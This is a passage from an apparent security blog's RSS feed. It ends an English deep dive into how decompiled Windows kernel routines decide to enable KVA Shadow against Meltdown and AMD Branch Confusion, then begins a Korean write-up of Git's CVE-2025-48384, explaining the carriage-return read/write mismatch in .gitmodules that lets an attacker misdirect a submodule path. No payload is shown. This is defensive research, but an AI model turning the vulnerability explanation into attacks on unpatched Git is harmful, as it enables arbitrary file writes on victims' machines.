class="hljs-number">2</span>;    **KiKvaLeakage = <span class="hljs-number">1</span>;**<span class="hljs-comment">//... for enable KVA</span>  }  <span class="hljs-keyword">return</span> _RAX;}</code></pre><p>The <code>KiDetectKvaLeakage</code> function determines whether KVAS is enabled based on CPU vendor and model information included in KPRCB and information that can be read from MSR. The verification routine can be divided into three main parts.</p><h3 id="Check-1"><a href="#Check-1" class="headerlink" title="Check 1"></a>Check 1</h3><ul><li>Check whether affected by Branch Confusion vulnerability through the <code>KiIsKvaShadowNeededForBranchConfusion</code> function</li><li>If the call result of the function is affected by Branch Confusion vulnerability, proceed to the <code>ENABLE_KVAS_BRANCH_CONFUSION</code> branch to activate KVAS</li></ul><h3 id="Check-2"><a href="#Check-2" class="headerlink" title="Check 2"></a>Check 2</h3><ul><li>Filter out older CPUs that are not affected by Meltdown and do not require KVAS activation using a bitmask, and disable KVAS.</li><li>Furthermore, since Meltdown is a vulnerability that only affects Intel processor architectures, disable KVAS for other vendors as well.</li></ul><h3 id="Check-3"><a href="#Check-3" class="headerlink" title="Check 3"></a>Check 3</h3><ul><li>First, check whether the CPU supports the MSR (Model Specific Register) function.<ul><li>If MSR is not supported, proceed to the <code>ENABLE_KVAS</code> branch to activate KVAS, as it is an older CPU affected by Meltdown.</li><li>Models that do not support MSR but are not affected are first filtered through a bitmask in the Check 2 routine.</li></ul></li><li>Read the MSR address <code>0x10A</code> using <code>__readmsr</code> - <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">IA32_ARCH_CAPABILITIES</a><ul><li>If field 0 (<code>RDCL_NO</code>) of the result (<code>_RAX</code>) is not enabled, proceed to the <code>ENABLE_KVAS</code> branch to enable KVAS</li><li>RDCL_NO: A bit flag indicating immunity to Rogue Data Cache Load (Meltdown)</li></ul></li></ul><p>If KVAS is determined to be necessary through the above verification process, <code>KiKvaLeakage</code> is set to 1.</p><p>The main functions of this function can be summarized as identifying Intel processors affected by the Meltdown vulnerability in Check 2 and Check 3 and setting the KVAS activation flag. Check 1 will be explained in more detail below.</p><h2 id="KVAS-Activation-for-Branch-Confusion"><a href="#KVAS-Activation-for-Branch-Confusion" class="headerlink" title="KVAS Activation for Branch Confusion"></a>KVAS Activation for Branch Confusion</h2><p>KVAS is not a mitigation that only applies to Meltdown. You can confirm this with the function <code>KiIsKvaShadowNeededForBranchConfusion</code> called in the Check 1 routine.</p><pre><code class="hljs powershell">__int64 __fastcall KiIsKvaShadowNeededForBranchConfusion(__int64 a1){  unsigned int v2; // ebx  __int128 v4; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">20</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">28</span><span class="hljs-type">h</span>] BYREF  __int64 v5; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">30</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">18</span><span class="hljs-type">h</span>]  v5 = <span class="hljs-number">0</span>i64;  v4 = <span class="hljs-number">0</span>i64;  KiDetectHardwareSpecControlFeatures(a1, <span class="hljs-number">0</span>i64, (__int64)&amp;v4, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0</span>x8000) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !(unsigned int)KiIsBranchConfusionMitigationDesired(a1, &amp;v4) )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  LOBYTE(v2) = (unsigned int)KiIsBranchConfusionMitigationSupported(a1, &amp;v4) != <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> v2;}</code></pre><p>As the function name suggests, this function checks whether the CPU is affected by the Branch Confusion vulnerability and determines whether KVA Shadow activation is necessary.</p><ul><li>If the <code>0x8000</code> bit of <code>v4</code>, the result of calling the <code>KiDetectHardwareSpecControlFeatures</code> function, is 1, the CPU is affected by Branch Confusion.</li><li>If the relevant mitigation is supported, it returns True. - It enters the KVAS activation routine from the <code>KiDetectKvaLeakage</code> function.</li></ul><p>Let&#x2019;s take a closer look at the <code>KiDetectHardwareSpecControlFeatures</code> function.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">KiDetectHardwareSpecControlFeatures</span><span class="hljs-params">(_KPRCB *PRCB, __int64 _zero, __int64 result2, <span class="hljs-keyword">char</span> *__zero)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> CpuModel_1; <span class="hljs-comment">// r14d</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">char</span> CpuType_Family; <span class="hljs-comment">// r12</span>  <span class="hljs-keyword">bool</span> IsAnyHypervisorPresent; <span class="hljs-comment">// r9</span>  <span class="hljs-keyword">char</span> CpuVendor_2; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorFlags; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuModel; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// al</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor_1; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span>      CpuVendor = PRCB-&gt;CpuVendor;  CpuType_Family = PRCB-&gt;CpuType_Family;  LOBYTE(CpuModel_1) = PRCB-&gt;CpuModel;<span class="hljs-comment">//...</span>  CpuVendor_1 = CpuVendor;  v48 = <span class="hljs-number">1</span>;    <span class="hljs-comment">// Hypervisor check</span>  <span class="hljs-keyword">if</span> ( HviIsHypervisorMicrosoftCompatible() )  {    HviGetEnlightenmentInformation(&amp;v54);    v53 = <span class="hljs-number">0</span>i64;    HviGetHypervisorFeatures(&amp;v53);    <span class="hljs-keyword">if</span> ( (v53 &amp; <span class="hljs-number">0x100000000000</span>i64) == <span class="hljs-number">0</span> || (v54 &amp; <span class="hljs-number">0x1000</span>) != <span class="hljs-number">0</span> )    {      IsAnyHypervisorPresent = <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {      IsAnyHypervisorPresent = <span class="hljs-number">0</span>;      v48 = <span class="hljs-number">0</span>;    }  }  <span class="hljs-keyword">else</span>  {    IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();    v48 = IsAnyHypervisorPresent;  }  v11 = result1;  <span class="hljs-keyword">if</span> ( KiIsBranchConfusionPresent(PRCB) )  {    v11 |= <span class="hljs-number">0x8000</span>ui64;    *&amp;result1 = v11;  }<span class="hljs-comment">//...</span>  *result2 = result1;  *(result2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>i64;  result = __zero;  <span class="hljs-keyword">if</span> ( __zero )    *__zero = v8;  <span class="hljs-keyword">return</span> result;}</code></pre><p>The function contains logic to check whether it is affected by various speculative execution-based side-channel vulnerabilities, but since the code is too long to write in its entirety, we will only look at the code that sets the <code>0x8000</code> bit to enable KVAS.</p><ul><li>For a list of speculative execution-related vulnerabilities, refer to <a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">MS Client Guidance</a></li></ul><p>If the return value of the <code>KiIsBranchConfusionPresent</code> function is True, the <code>0x8000</code> bit is set.</p><p><code>KiIsBranchConfusionPresent</code></p><pre><code class="hljs jsx">__int64 __fastcall KiIsBranchConfusionPresent(_KPRCB *a1){  bool IsAnyHypervisorPresent; <span class="hljs-comment">// al</span>  unsigned int v3; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">if</span> ( a1-&gt;CpuVendor != <span class="hljs-number">1</span> || (KeFeatureBits2 &amp; <span class="hljs-number">0x1000000</span>) != <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();  v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( IsAnyHypervisorPresent )    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;  LOBYTE(v3) = a1-&gt;CpuType_Family != <span class="hljs-number">25</span>;  <span class="hljs-keyword">return</span> v3;}</code></pre><p>The function logic can be analyzed as follows.</p><ol><li>If CpuVendor is not AMD, return False.<ul><li>Branch Confusion is a vulnerability that affects only AMD CPUs (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">CVE-2022-23825</a>)</li></ul></li><li>If the Hypervisor is enabled, the <code>HviIsAnyHypervisorPresent</code> function returns True<ul><li>CVE-2022-23825 is a vulnerability that affects virtualized environments, so KVAS is implemented to activate only when the hypervisor is enabled.</li></ul></li><li>Returns True only if the Family Number is 25 for Zen 3 / Zen 3+ / Zen 4.<ul><li>It can be seen that other architectures are not affected.</li></ul></li></ol><p>After that, there is a final check before KVAS activation in <code>KiEnableKvaShadowing</code>.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiEnableKvaShadowing</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 v2; <span class="hljs-comment">// rdx</span>  __int64 v3; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span>  __int64 v6; <span class="hljs-comment">// rdx</span>  __int64 v7; <span class="hljs-comment">// r11</span>  <span class="hljs-keyword">unsigned</span> __int8 v8; <span class="hljs-comment">// cf</span>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int16 v12; <span class="hljs-comment">// cx</span>  <span class="hljs-keyword">if</span> ( KiIsKvaShadowDisabled() )  {    KiIsKvaShadowConfigDisabled = <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x18000</span>) == <span class="hljs-number">0x8000</span> )      *(_QWORD *)(v3 + <span class="hljs-number">11520</span>) = <span class="hljs-number">3</span>i64;    v4 = KiKernelCetEnabled;    <span class="hljs-keyword">if</span> ( !(_BYTE)KiKernelCetEnabled &amp;&amp; (<span class="hljs-keyword">unsigned</span> __int8)KiIsKvaLeakSimulated() )      KiKvaLeakageSimulate = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Enable KVAS</span>    <span class="hljs-keyword">if</span> ( KiKvaLeakage || KiKvaLeakageSimulate )    {      <span class="hljs-keyword">if</span> ( v4 )        KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B766120</span>ui64, <span class="hljs-number">0x4B434554</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);      v5 = __readcr3();      a1-&gt;KernelDirectoryTableBase = v5;      *(_QWORD *)(v2 + <span class="hljs-number">4216</span>) = *(_QWORD *)(v2 + <span class="hljs-number">4100</span>);      KiInitializeDescriptorIst(a1);      *(_QWORD *)(v7 + <span class="hljs-number">4100</span>) = v7 + <span class="hljs-number">16896</span>;      <span class="hljs-keyword">if</span> ( a1-&gt;Number )      {        result = KiShadowProcessorAllocation(a1, v7);        <span class="hljs-keyword">if</span> ( !(_DWORD)result )          <span class="hljs-keyword">return</span> result;        v12 = *(_WORD *)(KeGetPrcb(<span class="hljs-number">0</span>i64) + <span class="hljs-number">44714</span>);        a1-&gt;ShadowFlags |= <span class="hljs-number">2u</span>;        a1-&gt;VerwSelector = v12;      }      <span class="hljs-keyword">else</span>      {        LOBYTE(v6) = <span class="hljs-number">1</span>;        KiInitializeIdt(v7, v6);        KeGetCurrentThread()-&gt;ApcState.Process-&gt;AddressPolicy = <span class="hljs-number">1</span>;        byte_140FCE0E0 = <span class="hljs-number">1</span>;        _InterlockedOr(dword_140FCE57C, <span class="hljs-number">0x4000</span>u);        KiSetAddressPolicy(<span class="hljs-number">1</span>i64);        v8 = _bittest64((<span class="hljs-keyword">const</span> <span class="hljs-keyword">signed</span> __int64 *)&amp;a1-&gt;FeatureBits, <span class="hljs-number">0x2A</span>u);        a1-&gt;VerwSelector = <span class="hljs-number">24</span>;        <span class="hljs-keyword">if</span> ( v8 )        {          v9 = __readcr4();          __writecr4(v9 &amp; <span class="hljs-number">0xFFFFFFFFFFFDFF7F</span>ui64 | <span class="hljs-number">0x20000</span>);          v10 = __readcr3();          __writecr3(v10 | <span class="hljs-number">2</span>);          KiFlushPcid |= <span class="hljs-number">1u</span>;        }        <span class="hljs-keyword">if</span> ( (a1-&gt;FeatureBits &amp; <span class="hljs-number">0x240000000000</span>i64) == <span class="hljs-number">0x240000000000</span>i64 )          KiFlushPcid |= <span class="hljs-number">2u</span>;        HvlRescindEnlightenments();        KiKvaShadow = <span class="hljs-number">1</span>;        KiKvaShadowMode = <span class="hljs-number">2</span> - (KiFlushPcid != <span class="hljs-number">0</span>);      }      <span class="hljs-keyword">if</span> ( KiFlushPcid )        _interlockedbittestandset64((<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">signed</span> __int32 *)&amp;a1-&gt;KernelDirectoryTableBase, <span class="hljs-number">0x3F</span>ui64);    }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;}</code></pre><ul><li><code>if ( KiKvaLeakage || KiKvaLeakageSimulate )</code> branch<ul><li>Global variable <code>KiKvaLeakage</code> set in the <code>KiDetectKvaLeakage</code> function</li><li>Global variable <code>KiKvaLeakageSimulate</code>, which is estimated to be determined by manual settings (for debugging and testing)</li></ul></li><li>If either of the two global variable values is set, KVAS is activated</li></ul><h1 id="Three-line-summary"><a href="#Three-line-summary" class="headerlink" title="Three-line summary"></a>Three-line summary</h1><ul><li>The Windows kernel dynamically activates KVAS (and other mitigations) at initialization depending on the CPU.</li><li>There are two main criteria for determining whether to activate KVAS<ul><li>Intel: Rogue Data Cache Load (Meltdown)</li><li>AMD: Branch Confusion</li></ul></li><li>The CPU checks whether hardware mitigations provided through MSR are applied, and if MSR functionality is not available, it determines whether to activate KVAS through legacy checks (bitmask, model number information, etc.).</li></ul><h1 id="Outro"><a href="#Outro" class="headerlink" title="Outro"></a>Outro</h1><p><img src="/2025/08/10/l0ch/deep-dive-into-kva/en/image1.jpg" alt="Untitled"><br>Actually, when side-channel vulnerabilities based on speculative execution were a hot topic, I was busy fulfilling my military service obligations and didn&#x2019;t have a chance to look into it properly. However, while writing this article and the previous one on KASLR bypass, I had the opportunity to examine it in detail. I realized once again that understanding past issues is just as important as keeping up with current trends.  <del>Now, I&#x2019;m going to try reading Windows Internals again&#x2026;</del></p><p>I&#x2019;ll bring you another interesting research topic next time~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825</a></p><p><a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html</a></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm</a></p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p><a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html</a></p><p><a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit-techniques/">exploit techniques</category>
      
      <category domain="https://hackyboiz.github.io/tags/KVAS/">KVAS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-48384: Git CLI의 임의 파일 쓰기 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/</link>
      <guid>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/</guid>
      <pubDate>Sat, 09 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-48384&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48384">https://nvd.nist.gov/vuln/detail/CVE-2025-48384</a></li><li><a href="https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384">https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>Git CLI(macOS &#xBC0F; Linux)</strong> </p><ul><li>Git &#x2264; 2.43.6</li><li>2.44.0 &#x2264; Git &#x2264; 2.44.3</li><li>2.45.0 &#x2264; Git &#x2264; 2.45.3</li><li>2.46.0 &#x2264; Git &#x2264; 2.46.3</li><li>2.47.0 &#x2264; Git &#x2264; 2.47.2</li><li>2.48.0 &#x2264; Git &#x2264; 2.48.1</li><li>2.49.0, 2.50.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Git&#xC740; &#xD558;&#xB098;&#xC758; &#xC800;&#xC7A5;&#xC18C; &#xC548;&#xC5D0; &#xB2E4;&#xB978; Git &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;(submodule) &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; &#xBCF4;&#xD1B5; &#xC678;&#xBD80; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB098; &#xACF5;&#xD1B5; &#xCF54;&#xB4DC;&#xB97C; &#xBCC4;&#xB3C4;&#xB85C; &#xAD00;&#xB9AC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC774; &#xB54C; Git&#xC740; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;&#xC758; &#xACBD;&#xB85C;(path), &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C; &#xC8FC;&#xC18C;(url) &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; .gitmodules &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD30C;&#xC77C;&#xC740; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xCEE4;&#xBC0B;&#xB418;&#xC5B4; &#xD568;&#xAED8; &#xC804;&#xD30C;&#xB418;&#xBA70;, Git&#xC740; &#xC774;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xC704; &#xBAA8;&#xB4C8;&#xC744; &#xD074;&#xB860;&#xD558;&#xAC70;&#xB098; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; <code>.gitmodules</code>  &#xD30C;&#xC77C;&#xC740; .ini &#xC2A4;&#xD0C0;&#xC77C;&#xC758; &#xAD6C;&#xBB38;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[section]</span>    <span class="hljs-attr">key</span> = value</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; Git&#xC740; DOS &#xC2A4;&#xD0C0;&#xC77C; &#xC904;&#xBC14;&#xAFC8; &#xBC29;&#xC2DD;&#xC778; CR+LF (Carriage Return + Line Feed)&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CR(Carriage Return): <code>\r</code>, &#xCEE4;&#xC11C;&#xB97C; &#xD604;&#xC7AC; &#xC904;&#xC758; &#xB9E8; &#xC55E;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li>LF(Line Feed): <code>\n</code>, &#xCEE4;&#xC11C;&#xB97C; &#xB2E4;&#xC74C; &#xC904;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;</li></ul><p>Git&#xC774; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xB294; <code>\r</code> &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xCF54;&#xB4DC;&#xB294; <code>config.c</code> &#xD30C;&#xC77C;&#xC758; <code>get_next_char()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get_next_char</span><span class="hljs-params">(struct config_source *cs)</span></span><span class="hljs-function"></span>{        <span class="hljs-keyword">int</span> c = cs-&gt;do_fgetc(cs);        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&apos;\r&apos;</span>) { <span class="hljs-comment">// [1]</span>                <span class="hljs-comment">/* DOS like systems */</span>                c = cs-&gt;do_fgetc(cs);                <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&apos;\n&apos;</span>) { <span class="hljs-comment">//[2]</span>                        <span class="hljs-keyword">if</span> (c != EOF)                                cs-&gt;do_ungetc(c, cs);                        c = <span class="hljs-string">&apos;\r&apos;</span>;                }        }</code></pre><p>[1] &#xBB38;&#xC790;&#xC5D0; <code>\r</code>&#xC774; &#xC788;&#xC744; &#xB54C;, &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xAC00; <code>\n</code>&#xC774;&#xBA74; &#x2192; <code>\r</code>&#xC740; &#xC81C;&#xAC70;&#xB418;&#xACE0; <code>\n</code>&#xB9CC; &#xBC18;&#xD658;&#xB418;&#xC9C0;&#xB9CC;,<br>[2]<code>\r</code> &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xAC00; <code>\n</code>&#xC774; &#xC544;&#xB2C8;&#xBA74; &#x2192; <code>\r</code>&#xC740; &#xADF8;&#xB300;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xACE0;, &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xB294; &#xB2E4;&#xC2DC; &#xB418;&#xB3CC;&#xB824;&#xC838; &#xB2E4;&#xC74C; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4; <code>(ungetc)</code><br>&#xC774; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC740; &#xC904; &#xB2E8;&#xC704;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC904; &#xB05D;&#xC5D0; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>\r</code>&#xC740; &#xD56D;&#xC0C1; &#xC81C;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xBB38;&#xC81C;&#xB294; Git&#xC774; <code>.gitmodules</code> &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xC640; &#xC4F8; &#xB54C;&#xC758; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC774; &#xB2E4;&#xB974;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. Git&#xC740; <code>.gitmidules</code> &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C; &#xC904; &#xB05D;&#xC5D0; &#xC788;&#xB294; <code>\r</code>&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD558;&#xC9C0;&#xB9CC;, &#xB098;&#xC911;&#xC5D0; &#xC774; &#xAC12;&#xC744; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xC4F8; &#xB54C;&#xB294; <code>\r</code>&#xC744; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xB85C; &#xC778;&#xD574; Git &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xACBD;&#xB85C; &#xAC12;&#xC774; &#xC77D;&#xC744; &#xB54C;&#xC640; &#xC4F8; &#xB54C; &#xB2E4;&#xB974;&#xAC8C; &#xC778;&#xC2DD;&#xB418;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xBD88;&#xC77C;&#xCE58;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC11C;&#xBE0C; &#xBAA8;&#xB4C8;&#xC774; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xBCF5;&#xC81C;&#xB418;&#xB3C4;&#xB85D; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>Git&#xC740; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xAE30;&#xB9CC; &#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xB2E4;&#xC2DC; &#xC4F8; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>git config</code> &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xC124;&#xC815; &#xAC12;&#xC744; &#xBC14;&#xAFB8;&#xBA74;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>write_pair()</code>&#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>key=value</code>&#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write_pair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *key, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *value, [...]</span></span><span class="hljs-function"><span class="hljs-params">{</span></span><span class="hljs-function"><span class="hljs-params">       [...]</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">       <span 